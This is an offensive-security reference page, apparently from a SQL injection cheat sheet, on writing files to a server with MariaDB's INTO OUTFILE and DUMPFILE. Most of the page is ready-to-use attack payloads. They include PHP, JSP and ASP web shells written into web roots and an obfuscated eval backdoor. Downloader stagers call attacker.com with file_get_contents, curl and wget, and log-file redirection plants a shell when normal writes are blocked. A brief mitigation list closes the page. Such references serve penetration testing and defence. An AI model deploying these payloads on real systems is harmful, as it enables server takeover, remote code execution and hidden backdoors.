---
title: Writing Files
description: Techniques for writing files to the filesystem using MariaDB
category: File Operations
order: 16
tags: ["file operations", "outfile", "dumpfile", "web shell"]
lastUpdated: 2025-12-18
---

## Writing Files

MariaDB provides functionality to write data to files on the server's filesystem, which can be exploited during SQL injection attacks if the database user has sufficient privileges.

### Prerequisites

To write files from MariaDB, the following conditions must be met:

1. The MariaDB user must have the `FILE` privilege
2. The directory must be writable by the MariaDB server process (usually `mysql` user)
3. You must know the absolute path where you want to write
4. The `secure_file_priv` setting must either be empty or set to a directory where you can write

### Important Constraints

| Constraint         | Description                                                                    |
| ------------------ | ------------------------------------------------------------------------------ |
| No Overwriting     | INTO OUTFILE/DUMPFILE cannot overwrite existing files                          |
| Statement Position | The INTO clause must be the last statement in the query                        |
| Pathname Quoting   | Quotation marks are mandatory for pathnames (hex encoding like 0x cannot work) |
| Max Packet Size    | Limited by `@@max_allowed_packet`                                              |

### Methods for Writing Files

MariaDB provides two primary statements for writing to files:

#### SELECT INTO OUTFILE

Writes a result set to a file, adding newlines between rows and field separators between columns:

```sql
-- Basic usage
SELECT 'data to write' INTO OUTFILE '/path/to/file.txt'

-- With multiple columns
SELECT id, username FROM users INTO OUTFILE '/tmp/users.txt'

-- Custom field separator (CSV format)
SELECT id, username FROM users
INTO OUTFILE '/tmp/users.csv'
FIELDS TERMINATED BY ','

-- With quoted fields
SELECT id, username FROM users
INTO OUTFILE '/tmp/users.csv'
FIELDS TERMINATED BY ',' ENCLOSED BY '"'

-- Custom line terminator
SELECT id FROM users
INTO OUTFILE '/tmp/ids.txt'
LINES TERMINATED BY '\r\n'
```

#### SELECT INTO DUMPFILE

Writes a result set to a file without any formatting (better for binary data and web shells):

```sql
SELECT 'data to write' INTO DUMPFILE '/path/to/file.txt'
```

**Important limitations:**

- DUMPFILE only writes **one row** - if your query returns multiple rows, it will fail
- No formatting is added (no newlines, no field separators)
- Ideal for binary data and web shells

```sql
-- Write binary data
SELECT UNHEX('48454C4C4F') INTO DUMPFILE '/tmp/hello.bin'

-- Fails with multiple rows
SELECT id FROM users LIMIT 2 INTO DUMPFILE '/tmp/test.bin'
-- Error: Result consisted of more than one row
```

### Checking for FILE Privilege

> **Note:** See [Privileges](/mariadb/privileges) for detailed FILE privilege checking queries.

### Checking secure_file_priv Setting

> **Note:** See [Privileges](/mariadb/privileges) for detailed secure_file_priv explanation and values.

The `secure_file_priv` setting restricts where MariaDB can read/write files:

```sql
-- Using SHOW VARIABLES
SHOW VARIABLES LIKE 'secure_file_priv'

-- Direct variable access
SELECT @@secure_file_priv AS path
```

```sql
-- Comprehensive file capability check
SELECT
  @@secure_file_priv AS secure_file_priv,
  @@datadir AS datadir,
  @@tmpdir AS tmpdir,
  @@max_allowed_packet AS max_packet
```

### Writing a Web Shell

One of the most common exploits is writing a web shell to gain remote code execution:

#### PHP Web Shell

```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- Or more obfuscated:
SELECT '<?php $c=$_GET["c"]; if(isset($c)) { eval(base64_decode($c)); } ?>' INTO OUTFILE '/var/www/html/images/blank.php';
```

#### JSP Web Shell

```sql
SELECT '<%@ page import="java.util.*,java.io.*"%><% Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); %>' INTO OUTFILE '/var/lib/tomcat/webapps/ROOT/shell.jsp';
```

#### ASP Web Shell

```sql
SELECT '<%Response.Write(CreateObject("WScript.Shell").exec(Request.QueryString("cmd")).StdOut.ReadAll())%>' INTO OUTFILE 'C:/inetpub/wwwroot/shell.asp';
```

### Writing Multiple Lines

For multiline content, you can use string concatenation and CHAR():

```sql
-- Using CONCAT with CHAR(10) for newlines
SELECT CONCAT(
  '<?php', CHAR(10),
  '// PHP Backdoor', CHAR(10),
  'if(isset($_POST["pass"]) && $_POST["pass"] == "secret") {', CHAR(10),
  '    eval(base64_decode($_POST["code"]));', CHAR(10),
  '}', CHAR(10),
  '?>'
) INTO DUMPFILE '/var/www/html/cache/stats.php'

-- Using CONCAT_WS with newline separator
SELECT CONCAT_WS(CHAR(10),
  '<?php',
  'system($_GET["cmd"]);',
  '?>'
) INTO DUMPFILE '/var/www/html/shell.php'
```

#### Special Characters Reference

| Character       | CHAR() Value | Description      |
| --------------- | ------------ | ---------------- |
| Newline (LF)    | `CHAR(10)`   | Unix line ending |
| Carriage Return | `CHAR(13)`   | Windows CR       |
| Tab             | `CHAR(9)`    | Tab character    |
| Space           | `CHAR(32)`   | Space            |
| Null byte       | `CHAR(0)`    | Binary null      |

### Finding Writable Directories

Common writable directories:

```text
/var/www/html/
/var/www/html/images/
/var/www/html/uploads/
/var/www/html/cache/
/tmp/
/var/tmp/
```

Use MariaDB system variables to discover paths:

```sql
-- Get MariaDB data directory
SELECT @@datadir AS datadir
-- Example: /var/lib/mysql/

-- Get temporary directory
SELECT @@tmpdir AS tmpdir
-- Example: /tmp

-- Get all file-related variables
SHOW VARIABLES WHERE Variable_name LIKE '%file%' OR Variable_name LIKE '%dir%'
```

### MariaDB-Specific Syntax Tolerance

MariaDB is sometimes more permissive with INTO OUTFILE positioning. It may accept:

```sql
-- WHERE after INTO OUTFILE (may work in MariaDB but not MySQL)
SELECT 1 INTO OUTFILE '/tmp/test.txt' WHERE 1=0
```

However, standard practice is to place INTO OUTFILE at the end of the query.

### Payload Delivery Techniques

When query length is limited (e.g., by application input validation or `@@max_allowed_packet`), write a small stager to fetch the full payload.

#### PHP Downloader

Write a minimal PHP script that downloads and writes a larger shell:

```sql
SELECT '<?php fwrite(fopen("/var/www/html/shell.php","w"),file_get_contents("http://attacker.com/shell.txt"));?>' INTO OUTFILE '/var/www/html/downloader.php';
```

**Requirements:**

- `allow_url_fopen=On` in php.ini (enabled by default, but often disabled in hardened configurations)
- Absolute path in `fopen()` to ensure the shell is written to the webroot

**Alternatives when `allow_url_fopen` is disabled:**

```sql
-- Use curl to download (requires shell_exec)
SELECT '<?php shell_exec("curl -o /var/www/html/shell.php http://attacker.com/shell.txt");?>' INTO OUTFILE '/var/www/html/dl.php';

-- Use wget
SELECT '<?php shell_exec("wget -O /var/www/html/shell.php http://attacker.com/shell.txt");?>' INTO OUTFILE '/var/www/html/dl.php';
```

#### Staged SQL Injection

If no outbound network access is available, stage the payload via multiple SQL injection writes:

```sql
-- Write part 1
SELECT '<?php /* PART1 */ $a="base64_decode"; $b=' INTO OUTFILE '/var/www/html/p1.txt';

-- Write part 2 (append not possible, so combine at runtime)
SELECT '"c3lzdGVtKCRfR0VUWydjJ10pOw=="; $a($b); ?>' INTO OUTFILE '/var/www/html/p2.txt';

-- Write combiner that includes both parts
SELECT '<?php include"/var/www/html/p1.txt";include"/var/www/html/p2.txt";?>' INTO OUTFILE '/var/www/html/shell.php';
```

### Overcoming Restrictions

#### When secure_file_priv is set

If `secure_file_priv` is set to a specific directory, you're limited to writing there:

```sql
-- Write to allowed directory, then leverage another vulnerability to access it
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/lib/mysql-files/shell.php';
```

#### File Already Exists

Since INTO OUTFILE cannot overwrite files, use unique filenames:

```sql
-- Use timestamp or random suffix
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell_20251218.php';
```

### Practical Examples

#### Writing a Simple Backdoor

```sql
-- Check where we can write
SHOW VARIABLES LIKE 'secure_file_priv'

-- Write a minimal backdoor
SELECT '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; system($_REQUEST["cmd"]); echo "</pre>"; } ?>'
INTO DUMPFILE '/var/www/html/images/1.php'
```

### Injection Context Examples

#### UNION with INTO OUTFILE

```sql
-- In real injection, extends existing query
SELECT id, username FROM users WHERE id = 999
UNION SELECT 1, 'injected data'
INTO OUTFILE '/tmp/output.txt'
```

#### Writing Subquery Results

```sql
-- Write query results to file
SELECT (SELECT GROUP_CONCAT(username) FROM users)
INTO OUTFILE '/tmp/users.txt'
```

#### Writing Hex-Encoded Content

```sql
-- UNHEX converts hex to binary
SELECT UNHEX('48656C6C6F20576F726C64')
INTO DUMPFILE '/tmp/hello.bin'
-- Writes: "Hello World"
```

### Binary Data Writing

```sql
-- Write binary using UNHEX
SELECT UNHEX('7F454C46') INTO DUMPFILE '/tmp/elf_header.bin'
-- Writes ELF magic bytes

-- Construct binary with CHAR (including null bytes)
SELECT CONCAT('data', CHAR(0), CHAR(0), 'more') INTO DUMPFILE '/tmp/with_nulls.bin'

-- Build shell characters individually
SELECT CONCAT(
  CHAR(60), CHAR(63), 'php ',  -- <?php
  'system(', CHAR(36), '_GET["c"]); ',  -- system($_GET["c"]);
  CHAR(63), CHAR(62)  -- ?>
) INTO DUMPFILE '/tmp/shell.php'
```

### Error Message Analysis

Common errors when writing files:

| Error Contains     | Meaning                              |
| ------------------ | ------------------------------------ |
| `secure-file-priv` | Write path not in allowed directory  |
| `Access denied`    | No FILE privilege                    |
| `already exists`   | Cannot overwrite existing file       |
| `Errcode: 2`       | Directory doesn't exist              |
| `Errcode: 13`      | Permission denied (filesystem level) |

```sql
-- Test write capability (will reveal error type)
SELECT 'test' INTO OUTFILE '/tmp/write_test.txt'
```

### Alternative Writing Methods

When INTO OUTFILE/DUMPFILE is blocked, consider log file manipulation:

#### General Log File Trick

Requires SUPER privilege to modify log settings:

```sql
-- Check current settings
SHOW VARIABLES LIKE 'general_log%'

-- Enable and redirect (requires SUPER)
SET GLOBAL general_log_file = '/var/www/html/shell.php'
SET GLOBAL general_log = 1

-- Execute payload as query (gets logged)
SELECT '<?php system($_GET["cmd"]); ?>'

-- Disable logging
SET GLOBAL general_log = 0
```

#### Slow Query Log Trick

```sql
-- Check slow query log settings
SHOW VARIABLES LIKE 'slow_query_log%'

-- Requires SUPER privilege to modify
SET GLOBAL slow_query_log_file = '/var/www/html/shell.php'
SET GLOBAL slow_query_log = 1
SET GLOBAL long_query_time = 0

-- Query gets logged
SELECT '<?php system($_GET["cmd"]); ?>' AND SLEEP(1)
```

**Note:** These require SUPER privilege which is typically not available.

### Mitigation

To prevent unauthorized file writing:

1. Limit FILE privilege to trusted users only
2. Set `secure_file_priv` to restrict file operations to a specific directory or NULL
3. Use prepared statements in application code
4. Implement proper input validation
5. Run MariaDB with minimum necessary privileges
